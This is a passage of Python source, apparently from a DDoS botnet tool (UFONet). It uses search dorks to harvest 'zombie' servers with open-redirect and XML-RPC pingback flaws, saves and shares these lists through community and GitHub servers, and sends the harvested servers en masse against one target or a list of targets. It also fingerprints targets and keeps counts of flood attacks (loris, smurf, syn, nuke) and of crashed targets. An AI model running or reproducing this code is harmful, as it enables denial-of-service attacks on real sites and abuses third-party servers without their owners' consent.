                if options.allengines:
                    if options.ex_engine: # exclude some search engines manually
                        exclude = options.ex_engine.split(",")
                        for ex in exclude:
                            ex = ex.lower()
                            if ex in self.search_engines:
                                if len(self.search_engines) == 1: # at least one should make it
                                    pass
                                else:
                                    self.search_engines.remove(ex)
                    for e in self.search_engines:
                        engine = e
                        print('='*44)
                        print(("\n[AI] Searching for zombies using: ["+engine+ "] from a list of [Dorks]\n"))
                        print('='*44 + '\n')
                        self.options.engine = engine
                        for dork in dorks:
                            print('='*22)
                            print("Dork:", dork)
                            print('='*22 + '\n')
                            try:
                                dorked_zombies = self.search_zombies(dork, zombies) # AI mode
                                for zombie in dorked_zombies:
                                    if zombie not in zombies: # evade repetitions for zombies found
                                        zombies.append(zombie)
                                        if zombie+os.linesep not in restored: # only append new zombies found
                                            with open(self.humans_file, "a") as f:
                                                f.write(str(zombie+os.linesep))
                                            f.close()
                            except:
                                if zombies: # backup new zombies found on exception
                                    for zombie in zombies:
                                        if zombie+os.linesep not in restored: # only append new zombies found
                                            with open(self.humans_file, "a") as f:
                                                f.write(str(zombie+os.linesep))
                                            f.close()
                else:
                    if restored:
                        print('='*44)
                    print(("\n[AI] Searching for zombies using: ["+ engine+ "] from a list of [Dorks]\n"))
                    print('='*44 + '\n')
                    for dork in dorks:
                        print('='*22)
                        print("Dork:", dork)
                        print('='*22 + '\n')
                        try:
                            dorked_zombies = self.search_zombies(dork, zombies) # AI mode
                            if dorked_zombies != None:
                                for zombie in dorked_zombies:
                                    if zombie not in zombies: # evade repetitions for zombies found
                                        zombies.append(zombie)
                        except:
                            if zombies: # backup new zombies found on exception
                                for zombie in zombies:
                                    if zombie+os.linesep not in restored: # only append new zombies found
                                        with open(self.humans_file, "a") as f:
                                            f.write(str(zombie+os.linesep))
                                        f.close()
                new_zombies = 0 # new zombies counter
                f = open(self.zombies_file, 'r')
                zz = f.readlines()
                f.close()
                zombies_found = []
                for z in zombies:
                    if z.endswith(os.linesep):
                        z = z.replace(os.linesep, "")
                    if z not in zz and z+os.linesep not in zz:
                        new_zombies = new_zombies + 1
                        zombies_found.append(z)
                print('='*62)
                print("\n- Victims found:", len(zombies_found), "\n")
                print("    - Restored:", total_restored)
                print("    - Dorked:", len(zombies_found) - total_restored, "\n")
                print('-'*32)
                print("\n- NEW possible zombies (NOT present in your army):", new_zombies, "\n")
                print('='*62 + '\n')
                if len(zombies_found) > 0:
                    if not self.options.forceyes:
                        check_backup_reply = input("[AI] Do you want to save the results for a future search? (Y/n)\n")
                        print('-'*25)
                    else:
                        check_backup_reply = "Y"
                    if check_backup_reply == "n" or check_backup_reply == "N":
                        if os.path.isfile(self.humans_file):
                            os.remove(self.humans_file) # remove search backup file (keeping love from shadows!)
                        print("\n[Info] [AI] Temporal data correctly removed...\n")
                    else:
                        with open(self.humans_file, "w") as f:
                            for z in zombies_found:
                                if z.endswith(os.linesep):
                                    z = z.replace(os.linesep, "")
                                if z not in zz or z+os.linesep not in zz:
                                    f.write(z+os.linesep)
                        f.close()
                        print("\n[Info] [AI] Correctly saved at: 'botnet/humans.txt'\n")
                    print('-'*25 + "\n")
                if new_zombies and new_zombies > 0:
                    if not self.options.forceyes:
                        check_url_link_reply = input("[AI] Do you want to check if NEW possible zombies are valid? (Y/n)\n")
                        print('-'*25 + "\n")
                    else:
                        check_url_link_reply = "Y"
                    if check_url_link_reply == "n" or check_url_link_reply == "N":
                        print("[AI] "+self.exit_msg+"\n")
                        pass
                    else:
                        print("\n" + '='*44)
                        test = self.testing(zombies_found)
                else:
                    print("[Info] [AI] NOT any NEW possible zombies found! -> [Exiting!]\n")
            except Exception:
                print(("\n[Error] [AI] Something wrong searching using: "+engine+"\n"))

        # auto-search for [Zombies] (dorks+all_engines+time -> to discover max new zombies)
        if options.autosearch:
            try:
                dorks = self.extract_dorks()
            except:
                print("\n[Info] [AI] Not any dork present at: 'botnet/dorks.txt' -> [Aborting!]\n")
                return
            engines_list = self.search_engines
            stop_flag = False # use a flag to establish an end
            try:
                self.banner()
                print("\n[AI] Searching automatically for [Zombies] (WARNING: this may take several time!)\n") 
                print("[Info] Try to use CTRL+z (on shell) to STOP IT! ;-)\n")
                print('-'*25 + "\n")
                zombies_found = []
                lz = open(self.zombies_file, 'r')
                zombies_army = lz.readlines()
                for zombie in zombies_army:
                    zombies_found.append(zombie) # add zombies from army to the zombies found pool
                lz.close()
                if not os.path.exists(self.humans_file) == True:
                    f = open(self.humans_file, 'w')
                    f.close()
                lf = open(self.humans_file, 'r')
                restored = lf.readlines()
                zombies_restored = len(restored)
                lf.close()
                if len(restored) > 0: 
                    print("[Info] [AI] You have [" + str(len(restored)) + " possible zombies] stored from a previous search...\n")
                    if not self.options.forceyes:
                        backup_reply = input("[AI] Do you want to resume it? (NOTE: If not, this DATA will be REMOVED) (Y/n)\n")
                        print('-'*25)
                    else:
                        backup_reply = "Y"
                    if backup_reply == "n" or backup_reply == "N":
                        print("\n[Info] [AI] Removing data stored and starting a new (auto)search...\n")
                        os.remove(self.humans_file)
                        zombies_restored = 0 # flush zombies restored
                        print('-'*25 + "\n")
                    else:
                        print("\n[Info] [AI] Restoring data and starting a new (auto)search...\n")
                        print('-'*25 + "\n")
                        for zombie in restored:
                            zombies_found.append(zombie) # add previous data to zombies found pool
                total_restored = zombies_restored
                while stop_flag == False:
                    if not os.path.exists(self.humans_file) == True:
                        f = open(self.humans_file, 'w')
                        f.close()
                    lf = open(self.humans_file, 'r') # read it on each iteration to update changes
                    restored = lf.readlines()
                    lf.close()
                    zombies_restored = len(restored)
                    for e in engines_list:
                        zombies_counter = 0 # use it also as (engine) flag
                        engine = e
                        self.options.engine = engine
                        print('='*44 + '\n')
                        print(("[AI] Searching for zombies using: "+engine+'\n'))
                        print('='*44 + '\n')
                        for dork in dorks:
                            print('='*22)
                            print("Dork:", dork)
                            print('='*22 + '\n')
                            try:
                                dorked_zombies = self.search_zombies(dork, zombies_found) # AI mode
                                for zombie in dorked_zombies:
                                    if zombie not in zombies_found: # evade repetitions for zombies found
                                        zombies_found.append(zombie)
                                        if zombie+os.linesep not in restored: # only append new zombies found
                                            with open(self.humans_file, "a") as f:
                                                f.write(str(zombie+os.linesep))
                                            f.close()
                                        zombies_counter = zombies_counter + 1
                            except:
                                if zombies_found: # backup new zombies found on exception
                                    for zombie in zombies_found:
                                        if zombie+os.linesep not in restored: # only append new zombies found
                                            with open(self.humans_file, "a") as f:
                                                f.write(str(zombie+os.linesep))
                                            f.close()
                        if zombies_counter == 0:
                            print("[Info] [AI] NOT more NEW victims found (by the moment) using: "+engine+" -> [Discarding!]\n")
                            print('-'*25 + "\n")
                            engines_list.remove(engine) # remove not more results engine from search engines list
                            if not engines_list: # if search engines empty, call return-exit routine
                                print("[Info] [AI] Search engines aren't providing more results -> [Exiting!]\n")
                                print('-'*25 + "\n")
                                stop_flag = True # exit flag up
                new_zombies = 0 # new zombies counter
                f = open(self.zombies_file, 'r')
                zz = f.readlines()
                f.close()
                all_zombies_found = []
                for z in zombies_found:
                    if z.endswith(os.linesep):
                        z = z.replace(os.linesep, "")
                    if z not in zz and z+os.linesep not in zz:
                        new_zombies = new_zombies + 1
                        all_zombies_found.append(z)
                print('='*62)
                print("\n- Victims found:", len(all_zombies_found), "\n")
                print("    - Restored:", total_restored)
                print("    - Dorked:", len(all_zombies_found) - total_restored, "\n")
                print('-'*32)
                print("\n- NEW possible zombies (NOT present in your army):", new_zombies, "\n")
                print('='*62 + '\n')
                if len(zombies_found) > 0:
                    if not self.options.forceyes:
                        check_backup_reply = input("[AI] Do you want to save the results for a future search? (Y/n)\n")
                        print('-'*25)
                    else:
                        check_backup_reply = "Y"
                    if check_backup_reply == "n" or check_backup_reply == "N":
                        if os.path.isfile(self.humans_file):
                            os.remove(self.humans_file) # remove search backup file (keeping love from shadows!)
                        print("\n[Info] [AI] Temporal data correctly removed...\n")
                    else:
                        with open(self.humans_file, "w") as f:
                            for z in all_zombies_found:
                                if z.endswith(os.linesep):
                                    z = z.replace(os.linesep, "")
                                if z not in zz or z+os.linesep not in zz:
                                    f.write(z+os.linesep)
                        f.close()
                        print("\n[Info] [AI] Correctly saved at: 'botnet/humans.txt'\n")
                    print('-'*25 + "\n")
                if new_zombies and new_zombies > 0:
                    if not self.options.forceyes:
                        check_url_link_reply = input("[AI] Do you want to check if NEW possible zombies are valid? (Y/n)\n")
                        print('-'*25 + "\n")
                    else:
                        check_url_link_reply = "Y"
                    if check_url_link_reply == "n" or check_url_link_reply == "N":
                        print("[AI] "+self.exit_msg+"\n")
                        pass
                    else:
                        print("\n" + '='*44)
                        test = self.testing(all_zombies_found)
                else:
                    print("[Info] [AI] NOT any NEW possible zombies found! -> [Exiting!]\n")
            except Exception:
                print ("[Error] [AI] Something wrong (auto)searching...\n")

        # test web 'zombie' servers -> show statistics
        if options.test: 
            try:
                self.banner()
                zombies = self.extract_zombies()
                if not zombies:
                    return
                test = self.testing(zombies)
                self.update_missions_stats() # update mothership missions stats
            except Exception:
                print ("\n[Error] [AI] Something wrong testing!\n")
                if DEBUG == True:
                    traceback.print_exc()

        # test XML-'rpc' pingback vulnerable servers -> update list
        if options.testrpc:
            try:
                self.banner()
                rpcs = self.extract_rpcs()
                if not rpcs:
                    return
                testrpc = self.testing_rpcs(rpcs)
                self.update_missions_stats() # update mothership missions stats
            except Exception:
                print ("\n[Error] [AI] Something wrong testing X-RPCs!\n")
                if DEBUG == True:
                    traceback.print_exc()

        # check botnet searching for zombies offline
        if options.testoffline:
            try:
                self.banner()
                testbotnet = self.testing_offline()
                self.update_missions_stats() # update mothership missions stats
            except Exception:
                print ("\n[Error] [AI] Something wrong checking for offline [Zombies]!\n")
                if DEBUG == True:
                    traceback.print_exc()

        # check ALL botnet status
        if options.testall:
            try:
                self.banner()
                test_all_botnet = self.testing_all()
                self.update_missions_stats() # update mothership missions stats
            except Exception:
                print ("\n[Error] [AI] Something wrong testing ALL botnet status!\n")
                if DEBUG == True:
                    traceback.print_exc()

        # attack target -> exploit Open Redirect massively and conduct vulnerable servers to a single target
        if options.target:
            try:
                self.banner()
                zombies = self.extract_zombies()
                if not zombies:
                    return
                options.target = self.parse_url_encoding(options.target) # parse for proper url encoding
                attack = self.attacking(zombies, options.target)
                self.update_missions_stats() # update mothership missions stats
            except Exception:
                print ("\n[Error] [AI] Something wrong attacking!\n")
                if DEBUG == True:
                    traceback.print_exc()

        # attack a list of targets -> exploit Open Redirect massively and conduct vulnerable servers to multiple targets
        if options.target_list:
            try:
                self.banner()
                zombies = self.extract_zombies()
                if not zombies:
                    return
                targets = self.extract_target_list()
                if not targets:
                    print("\n[Error] [AI] You haven't any valid [Target] to be extracted from: "+str(options.target_list)+" -> [Exiting!]\n")
                    return
                self.options.forceyes = True # force-yes ON!
                self.num_target_list = 0
                print("\n[AI] Checking integrity of targets...\n")
                for t in targets: # start of code block dedicated to: Guido van Rossum [23/12/2018]
                    if not t.startswith("http"): # discarded inmediately
                        print("[Info] [AI] [Control] " + str(t) + " -> [Discarding!]")
                        targets.remove(t) # ¿remove? invalid targets
                print("")
                c = 0
                for target in targets:
                    if target == "":
                        c = c + 1
                    else:
                        self.num_target_list = self.num_target_list + 1
                if c == len(targets):
                    print("\n[Error] [AI] You haven't any valid [Target] to be extracted from: "+str(options.target_list)+" -> [Exiting!]\n")
                    return # end of code block dedicated to: Guido van Rossum [23/12/2018]
                else:
                    for target in targets:
                        self.options.target = self.parse_url_encoding(target) # parse for proper url encoding
                        target = self.options.target
                        print('='*55 + "\n")
                        print("[Info] [AI] Aiming: " + str(target) + " -> [OK!]\n")
                        print("="*55)
                        attack = self.attacking(zombies, target)
                        self.update_missions_stats() # update mothership missions stats (each target counts)
            except Exception:
                print ("\n[Error] [AI] Something wrong attacking to multiple targets!\n")
                if DEBUG == True:
                    traceback.print_exc()

        # inspect target -> inspect target's components sizes
        if options.inspect:
            try:
                self.banner()
                print("\n[AI] Inspecting target for local resources... to find the best place to attack... SSssh!\n")
                print('='*22 + '\n')
                self.instance = Inspector(self) # instance main class for inspection operations
                inspection = self.instance.inspecting(options.inspect)
                self.update_missions_stats() # update mothership missions stats
            except Exception as e:
                print ("\n[Error] [AI] Something wrong inspecting... Not any object found!\n")
                if DEBUG == True:
                    traceback.print_exc()
                return #sys.exit(2)

        # abduct target -> examine target's webserver configuration (banner grabbing, anti-ddos, etc.)
        if options.abduction:
            try:
                self.banner()
                print("\n[AI] Abducting target to extract interesting information... Be patient!\n")
                print('='*22 + '\n')
                self.instance = Abductor(self) # instance main class for abduction operations
                abduction = self.instance.abducting(options.abduction)
                self.update_missions_stats() # update mothership missions stats
            except Exception as e:
                print ("\n[Error] [AI] Something wrong abducting... Not any data stream found!\n")
                if DEBUG == True:
                    traceback.print_exc()
                return #sys.exit(2)

        # attack me -> exploit Open Redirect massively and connect all vulnerable servers to master for benchmarking
        if options.attackme:
            self.mothership_id = self.mothership_id[:25] # truncating anti-formats ;-)
            try:
                self.banner()
                print("\n[AI] Ordering [Zombies] to attack you for benchmarking ;-)\n")
                print("[Warning] You are going to reveal your real IP to [Zombies]!\n")
                if not self.options.forceyes:
                    update_reply = input("[AI] Do you want to continue? (Y/n)")
                else:
                    update_reply = "Y"
                if update_reply == "n" or update_reply == "N":
                    print("\n[Info] [AI] [Control] Aborting 'Attack-Me' test... -> [Exiting!]\n")
                    return
                self.mothership_hash = str(random.getrandbits(128)) # generating random evasion hash  
                print("\nMothership ID: " + self.mothership_id + "RND: " + self.mothership_hash)
                print("\n[AI] Checking NAT/IP configuration:\n")
                nat = self.check_nat()
                f = open("alien", "w") # generate random alien worker
                f.write(str(self.mothership_hash))
                f.close()
                if self.nat_error_flag == "ON":
                    return
                zombies = self.extract_zombies()
                if not zombies:
                    return
                attackme = self.attackme(zombies)
                self.update_missions_stats() # update mothership missions stats
            except Exception as e:
                print ("\n[Error] [AI] Something wrong redirecting [Zombies] against you...\n")
                if DEBUG == True:
                    traceback.print_exc()
                return #sys.exit(2)

        # check/update for latest stable version
        if options.update:
            self.banner()
            try:
                print("\n[AI] Trying to update automatically to the latest stable version\n")
                Updater() 
            except:
                print("Not any .git repository found!\n")
                print("="*30)
                print("\nTo have working this feature, you should clone UFONet with:\n")
                print("$ git clone %s" % self.GIT_REPOSITORY)
                print("\nAlso you can try this other mirror:\n")
                print("$ git clone %s" % self.GIT_REPOSITORY2 + "\n")

        # launch GUI/Web interface
        if options.web:
            self.create_web_interface()
            return

        # generate [Blackhole] server to share [Zombies]
        if options.blackhole is not None:
            self.banner()
            try:
                blackhole_lib = os.path.abspath(os.path.join('core/tools')) # add [Blackhole] lib
                sys.path.append(blackhole_lib)
                from core.tools.blackhole import BlackHole
                print("\n[AI] Initiating void generation sequence...\n")
                print('='*22 + '\n')
                app = BlackHole()
                app.start()
                while True: time.sleep(1)
            except KeyboardInterrupt:
                print("\n[AI] Terminating void generation sequence...\n")
                app.collapse()
            except Exception as e:
                print("[Error] "+str(e)) 
                print("\n[AI] Something was wrong generating [Blackhole]... -> [Aborting!]\n")

        # create [Grider] server to share [Stats/Wargames/Messages]
        if options.grider is not None:
            self.banner()
            try:
                grider_lib = os.path.abspath(os.path.join('core/tools')) # add [Grider] lib
                sys.path.append(grider_lib)
                from core.tools.grider import Grider
                print("\n[AI] Initiating void generation sequence...\n")
                print('='*22 + '\n')
                app = Grider()
                app.start()
                while True: time.sleep(1)
            except KeyboardInterrupt:
                print("\n[AI] Terminating void generation sequence...\n")
                app.collapse()
            except Exception as e:
                print("[Error] "+str(e))
                print("\n[AI] Something was wrong generating [Grider]... -> [Aborting!]\n")

        # download list of [Zombies] from a [Blackhole] IP
        if options.dip is not None:
            options.download = True
            self.blackhole = options.dip

        # upload list of [Zombies] to a [Blackhole] IP
        if options.upip is not None:
            options.upload = True
            self.blackhole = options.upip

        # download list of [Zombies] from Community server [20/01/2020 OK!]
        if options.download:
            try:
                self.banner()
                if options.dip is not None:
                    print(("\n[AI] Downloading list of [Zombies] from [Private] server: "+self.blackhole+" ...\n"))
                else:
                    print("\n[AI] Downloading list of [Zombies] from [Community] server ...\n")
                print('='*22 + '\n')
                download_list = self.downloading_list()
            except Exception as e:
                print ("[Error] [AI] Something wrong downloading! -> [Exiting!]\n")
                return

        # upload list of [Zombies] to Community server [20/01/2020 OK!]
        if options.upload:
            try:
                self.banner()
                if options.upip is not None:
                    print(("\n[AI] Uploading list of [Zombies] to [Private] server: "+self.blackhole+" ...\n"))
                else:
                    print("\n[AI] Uploading list of [Zombies] to [Community] server ...\n")
                print('='*22 + '\n')
                upload_list = self.uploading_list()
            except Exception as e:
                print(("[Error] [AI] Something wrong uploading! "+str(e)+" -> [Exiting!]\n"))
                if DEBUG == True:
                    traceback.print_exc()
                return #sys.exit(2)

        # download list of [Zombies] from GitHub server [20/01/2020 OK!]
        if options.download_github:
            try:
                self.banner()
                print("\n[AI] Downloading list of [Zombies] from [GitHub] server ...\n")
                print('='*22 + '\n')
                download_github_list = self.downloading_github_list()
            except Exception as e:
                print ("[Error] [AI] Something wrong downloading! -> [Exiting!]\n")
                return

        # upload list of [Zombies] to GitHub server [20/01/2020 OK!]
        if options.upload_github:
            try:
                self.banner()
                print("\n[AI] Uploading 'zombies' to [GitHub] is simple. Follow the next steps:\n")
                print('='*22 + '\n')
                upload_github_list = self.uploading_github_list()
            except Exception as e:
                print(("[Error] [AI] Something wrong uploading! "+str(e)+" -> [Exiting!]\n"))
                if DEBUG == True:
                    traceback.print_exc()
                return #sys.exit(2)

    # starting new zombie thread
    def connect_zombies(self, zombie):
        z=Zombie(self, zombie)
        t = threading.Thread(target=z.connect, name=zombie)
        t.start()

    # single connection handling
    def connect_zombie(self, zombie):
        z=Zombie(self,zombie)
        return z.connect()

    def extract_proxy(self, proxy):
        sep = ":"
        proxy_ip = proxy.rsplit(sep, 1)[0]
        if proxy_ip.startswith('http://'):
            proxy_ip = proxy_ip.replace('http://', '')
        elif proxy_ip.startswith('https://'):
            proxy_ip = proxy_ip.replace('https://', '')
        if proxy_ip == '127.0.0.1': # working by using 'localhost' as http proxy (privoxy, ...)
            proxy_ip = 'localhost'
        proxy_port = proxy.rsplit(sep, 1)[1]
        proxy_url = proxy_ip + ":" + proxy_port # ex: localhost:8118
        return proxy_url

    def proxy_transport(self, proxy):
        proxy_url = self.extract_proxy(proxy)
        proxy = urllib.request.ProxyHandler({'https': proxy_url})
        opener = urllib.request.build_opener(proxy)
        urllib.request.install_opener(opener)

    def check_mothership_chargo(self):
        f = open(self.zombies_file)
        self.zombies = f.readlines()
        self.zombies = [zombie.replace('\n', '') for zombie in self.zombies]
        self.list_zombies = []
        for zombie in self.zombies:
            t = urlparse(zombie)
            name_zombie = t.netloc
            if name_zombie == "":
                name_zombie = zombie
            self.list_zombies.append(name_zombie)
        self.num_zombies = str(len(self.zombies))
        f.close()
        f = open(self.aliens_file)
        self.aliens = f.readlines()
        self.aliens = [alien.replace('\n', '') for alien in self.aliens]
        self.list_aliens = []
        for alien in self.aliens:
            t = urlparse(alien)
            name_alien = t.netloc
            if name_alien == "":
                name_alien = alien
            self.list_aliens.append(name_alien)
        self.num_aliens = str(len(self.aliens))
        f.close()
        f = open(self.droids_file)
        self.droids = f.readlines()
        self.droids = [droid.replace('\n', '') for droid in self.droids]
        self.list_droids = []
        for droid in self.droids:
            t = urlparse(droid)
            name_droid = t.netloc
            if name_droid == "":
                name_droid = droid
            self.list_droids.append(name_droid)
        self.num_droids = str(len(self.droids))
        f.close()
        f = open(self.ucavs_file)
        self.ucavs = f.readlines()
        self.ucavs = [ucav.replace('\n', '') for ucav in self.ucavs]
        self.list_ucavs = []
        for ucav in self.ucavs:
            t = urlparse(ucav)
            name_ucav = t.netloc
            if name_ucav == "":
                name_ucav = ucav
            self.list_ucavs.append(name_ucav)
        self.num_ucavs = str(len(self.ucavs))
        f.close()
        f = open(self.rpcs_file)
        self.rpcs = f.readlines()
        self.rpcs = [rpc.replace('\n', '') for rpc in self.rpcs]
        self.list_rpcs = []
        for rpc in self.rpcs:
            t = urlparse(rpc)
            name_rpc = t.netloc
            if name_rpc == "":
                name_rpc = rpc
            self.list_rpcs.append(name_rpc)
        self.num_rpcs = str(len(self.rpcs))
        f.close()
        self.total_botnet = str(int(self.num_zombies) + int(self.num_aliens) + int(self.num_droids) + int(self.num_ucavs) + int(self.num_rpcs))
        return self.total_botnet

    def update_flying_stats(self):
        if not os.path.exists(self.mothership_stats_file) == True: # create data when no stats file (first time used)
            with open(self.mothership_stats_file, "w") as f:
                json.dump({"flying": "0", "missions": "0", "scanner": "0", "transferred": "0", "max_chargo": "0", "completed": "0", "loic": "0", "loris": "0", "ufosyn": "0", "spray": "0", "smurf": "0", "fraggle": "0", "xmas": "0", "ufoack": "0", "uforst": "0", "droper": "0", "overlap": "0", "pinger": "0", "ufoudp": "0", "nuke": "0", "tachyon": "0", "monlist": "0", "sniper": "0", "crashed": "0"}, f, indent=4) # starting reset
        stats_json_file = open(self.mothership_stats_file, "r")
        data = json.load(stats_json_file)
        stats_json_file.close()
        aflying = data["flying"]
        aflying = str(int(aflying) + 1) # add new flying time
        data["flying"] = aflying
        stats_json_file = open(self.mothership_stats_file, "w+")
        stats_json_file.write(json.dumps(data))
        stats_json_file.close()

    def update_mothership_stats(self):
        stats_json_file = open(self.mothership_stats_file, "r")
        data = json.load(stats_json_file)
        stats_json_file.close()
        acompleted = data["completed"]
        acompleted = str(int(acompleted) + 1) # add new completed attack
        data["completed"] = acompleted
        stats_json_file = open(self.mothership_stats_file, "w+")
        stats_json_file.write(json.dumps(data))
        stats_json_file.close()

    def update_targets_crashed(self):
        stats_json_file = open(self.mothership_stats_file, "r")
        data = json.load(stats_json_file)
        stats_json_file.close()
        tcrashed = data["crashed"]
        tcrashed = str(int(tcrashed) + 1) # add new crashed target
        data["crashed"] = tcrashed
        stats_json_file = open(self.mothership_stats_file, "w+")
        stats_json_file.write(json.dumps(data))
        stats_json_file.close()

    def update_missions_stats(self):
        stats_json_file = open(self.mothership_stats_file, "r")
        data = json.load(stats_json_file)
        stats_json_file.close()
        missions = data["missions"]
        missions = str(int(missions) + 1) # add new mission target
        data["missions"] = missions
        stats_json_file = open(self.mothership_stats_file, "w+")
        stats_json_file.write(json.dumps(data))
        stats_json_file.close()

    def update_scanner_stats(self, num):
        stats_json_file = open(self.mothership_stats_file, "r")
        data = json.load(stats_json_file)
        stats_json_file.close()
        scanner = data["scanner"]
        scanner = str(int(scanner) + int(num)) # add new zombies found by dorking to mothership stats
        data["scanner"] = scanner
        stats_json_file = open(self.mothership_stats_file, "w+")
        stats_json_file.write(json.dumps(data))
        stats_json_file.close()

    def update_transferred_stats(self, num):
        stats_json_file = open(self.mothership_stats_file, "r")
        data = json.load(stats_json_file)
        stats_json_file.close()
        transferred = data["transferred"]
        transferred = str(int(transferred) + int(num)) # add new zombies found by downloading via blackholes to mothership stats
        data["transferred"] = transferred
        stats_json_file = open(self.mothership_stats_file, "w+")
        stats_json_file.write(json.dumps(data))
        stats_json_file.close()

    def update_max_chargo(self, chargo):
        stats_json_file = open(self.mothership_stats_file, "r")
        data = json.load(stats_json_file)
        stats_json_file.close()
        amax_chargo = data["max_chargo"]
        if int(chargo) > int(amax_chargo): # new max chargo found
            amax_chargo = chargo # add new max chargo
        else:
            amax_chargo = data["max_chargo"]
        data["max_chargo"] = amax_chargo
        stats_json_file = open(self.mothership_stats_file, "w+")
        stats_json_file.write(json.dumps(data))
        stats_json_file.close()

    def update_loic_stats(self):
        stats_json_file = open(self.mothership_stats_file, "r")
        data = json.load(stats_json_file)
        stats_json_file.close()
        aloic = data["loic"]
        aloic = str(int(aloic) + 1) # add new loic attack to recorded stats
        self.total_loic = self.total_loic + 1 # add new loic attack to session stats
        data["loic"] = aloic
        stats_json_file = open(self.mothership_stats_file, "w+")
        stats_json_file.write(json.dumps(data))
        stats_json_file.close()

    def update_loris_stats(self):
        stats_json_file = open(self.mothership_stats_file, "r")
        data = json.load(stats_json_file)
        stats_json_file.close()
        aloris = data["loris"]
        aloris = str(int(aloris) + 1) # add new loris attack to recorded stats
        self.total_loris = self.total_loris + 1 # add new loris attack to session stats
        data["loris"] = aloris
        stats_json_file = open(self.mothership_stats_file, "w+")
        stats_json_file.write(json.dumps(data))
        stats_json_file.close()

    def update_ufosyn_stats(self):
        stats_json_file = open(self.mothership_stats_file, "r")
        data = json.load(stats_json_file)
        stats_json_file.close()
        aufosyn = data["ufosyn"]
        aufosyn = str(int(aufosyn) + 1) # add new ufosyn attack to recorded stats
        self.total_syn = self.total_syn + 1 # add new ufosyn attack to session stats
        data["ufosyn"] = aufosyn
        stats_json_file = open(self.mothership_stats_file, "w+")
        stats_json_file.write(json.dumps(data))
        stats_json_file.close()

    def update_spray_stats(self):
        stats_json_file = open(self.mothership_stats_file, "r")
        data = json.load(stats_json_file)
        stats_json_file.close()
        aspray = data["spray"]
        aspray = str(int(aspray) + 1) # add new spray attack to recorded stats
        self.total_spray = self.total_spray + 1 # add new spray attack to session stats
        data["spray"] = aspray
        stats_json_file = open(self.mothership_stats_file, "w+")
        stats_json_file.write(json.dumps(data))
        stats_json_file.close()

    def update_smurf_stats(self):
        stats_json_file = open(self.mothership_stats_file, "r")
        data = json.load(stats_json_file)
        stats_json_file.close()
        asmurf = data["smurf"]
        asmurf = str(int(asmurf) + 1) # add new smurf attack to recorded stats
        self.total_smurf = self.total_smurf + 1 # add new smurf attack to session stats
        data["smurf"] = asmurf
        stats_json_file = open(self.mothership_stats_file, "w+")
        stats_json_file.write(json.dumps(data))
        stats_json_file.close()

    def update_fraggle_stats(self):
        stats_json_file = open(self.mothership_stats_file, "r")
        data = json.load(stats_json_file)
        stats_json_file.close()
        afraggle = data["fraggle"]
        afraggle = str(int(afraggle) + 1) # add new fraggle attack to recorded stats
        self.total_fraggle = self.total_fraggle + 1 # add new fraggle attack to session stats
        data["fraggle"] = afraggle
        stats_json_file = open(self.mothership_stats_file, "w+")
        stats_json_file.write(json.dumps(data))
        stats_json_file.close()

    def update_xmas_stats(self):
        stats_json_file = open(self.mothership_stats_file, "r")
        data = json.load(stats_json_file)
        stats_json_file.close()
        axmas = data["xmas"]
        axmas = str(int(axmas) + 1) # add new xmas attack to recorded stats
        self.total_xmas = self.total_xmas + 1 # add new xmas attack to session stats
        data["xmas"] = axmas
        stats_json_file = open(self.mothership_stats_file, "w+")
        stats_json_file.write(json.dumps(data))
        stats_json_file.close()

    def update_ufoack_stats(self):
        stats_json_file = open(self.mothership_stats_file, "r")
        data = json.load(stats_json_file)
        stats_json_file.close()
        aufoack = data["ufoack"]
        aufoack = str(int(aufoack) + 1) # add new ufoack attack to recorded stats
        self.total_ufoack = self.total_ufoack + 1 # add new ufoack attack to session stats
        data["ufoack"] = aufoack
        stats_json_file = open(self.mothership_stats_file, "w+")
        stats_json_file.write(json.dumps(data))
        stats_json_file.close()

    def update_uforst_stats(self):
        stats_json_file = open(self.mothership_stats_file, "r")
        data = json.load(stats_json_file)
        stats_json_file.close()
        auforst = data["uforst"]
        auforst = str(int(auforst) + 1) # add new uforst attack to recorded stats
        self.total_uforst = self.total_uforst + 1 # add new uforst attack to session stats
        data["uforst"] = auforst
        stats_json_file = open(self.mothership_stats_file, "w+")
        stats_json_file.write(json.dumps(data))
        stats_json_file.close()

    def update_droper_stats(self):
        stats_json_file = open(self.mothership_stats_file, "r")
        data = json.load(stats_json_file)
        stats_json_file.close()
        adroper = data["droper"]
        adroper = str(int(adroper) + 1) # add new droper attack to recorded stats
        self.total_droper = self.total_droper + 1 # add new droper attack to session stats
        data["droper"] = adroper
        stats_json_file = open(self.mothership_stats_file, "w+")
        stats_json_file.write(json.dumps(data))
        stats_json_file.close()

    def update_overlap_stats(self):
        stats_json_file = open(self.mothership_stats_file, "r")
        data = json.load(stats_json_file)
        stats_json_file.close()
        aoverlap = data["overlap"]
        aoverlap = str(int(aoverlap) + 1) # add new overlap attack to recorded stats
        self.total_overlap = self.total_overlap + 1 # add new overlap attack to session stats
        data["overlap"] = aoverlap
        stats_json_file = open(self.mothership_stats_file, "w+")
        stats_json_file.write(json.dumps(data))
        stats_json_file.close()

    def update_pinger_stats(self):
        stats_json_file = open(self.mothership_stats_file, "r")
        data = json.load(stats_json_file)
        stats_json_file.close()
        apinger = data["pinger"]
        apinger = str(int(apinger) + 1) # add new pinger attack to recorded stats
        self.total_pinger = self.total_pinger + 1 # add new pinger attack to session stats
        data["pinger"] = apinger
        stats_json_file = open(self.mothership_stats_file, "w+")
        stats_json_file.write(json.dumps(data))
        stats_json_file.close()

    def update_ufoudp_stats(self):
        stats_json_file = open(self.mothership_stats_file, "r")
        data = json.load(stats_json_file)
        stats_json_file.close()
        aufoudp = data["ufoudp"]
        aufoudp = str(int(aufoudp) + 1) # add new ufoudp attack to recorded stats
        self.total_ufoudp = self.total_ufoudp + 1 # add new ufoudp attack to session stats
        data["ufoudp"] = aufoudp
        stats_json_file = open(self.mothership_stats_file, "w+")
        stats_json_file.write(json.dumps(data))
        stats_json_file.close()

    def update_nuke_stats(self):
        stats_json_file = open(self.mothership_stats_file, "r")
        data = json.load(stats_json_file)
        stats_json_file.close()
        anuke = data["nuke"]
        anuke = str(int(anuke) + 1) # add new nuke attack to recorded stats
        self.total_nuke = self.total_nuke + 1 # add new nuke attack to session stats
        data["nuke"] = anuke
        stats_json_file = open(self.mothership_stats_file, "w+")
        stats_json_file.write(json.dumps(data))
        stats_json_file.close()

    def update_tachyon_stats(self):
        stats_json_file = open(self.mothership_stats_file, "r")
        data = json.load(stats_json_file)
        stats_json_file.close()
        atachyon = data["tachyon"]
        atachyon = str(int(atachyon) + 1) # add new tachyon attack to recorded stats
